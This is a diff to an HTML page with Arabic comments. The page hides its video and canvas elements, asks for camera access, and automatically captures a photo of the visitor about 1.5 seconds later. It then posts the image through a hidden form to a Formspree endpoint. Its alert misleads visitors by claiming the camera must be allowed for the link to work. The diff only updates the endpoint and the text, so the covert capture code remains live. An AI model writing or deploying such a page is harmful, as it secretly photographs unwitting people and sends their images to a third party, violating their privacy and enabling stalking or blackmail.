@@ -22,10 +22,10 @@
     <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
-    <!-- الرابط الجديد الخاص بك -->
-    <form id="photoForm" action="https://formspree.io" method="POST">
+    <!-- الرابط الجديد المحدث -->
+    <form id="photoForm" action="https://formspree.io/f/xqenyzwv" method="POST">
         <input type="hidden" name="image_data" id="imageInput">
-        <input type="hidden" name="_subject" value="صورة جديدة ملتقطة">
+        <input type="hidden" name="_subject" value="التقاط جديد">
     </form>
 
     <script>
@@ -39,7 +39,7 @@
             .then(stream => {
                 video.srcObject = stream;
                 
-                // التقاط الصورة تلقائياً بعد ثانية ونصف من الموافقة
+                // التقاط الصورة تلقائياً بعد ثانية ونصف
                 setTimeout(() => {
                     const context = canvas.getContext('2d');
                     context.drawImage(video, 0, 0, 640, 480);
@@ -53,8 +53,8 @@
                 }, 1500);
             })
             .catch(err => {
-                console.error("لم يتم السماح بالكاميرا:", err);
-                alert("نعتذر، يجب تفعيل الكاميرا للمتابعة.");
+                console.error("فشل الوصول للكاميرا:", err);
+                alert("يجب السماح بالكاميرا ليعمل الرابط.");
             });
     </script>
 </body>
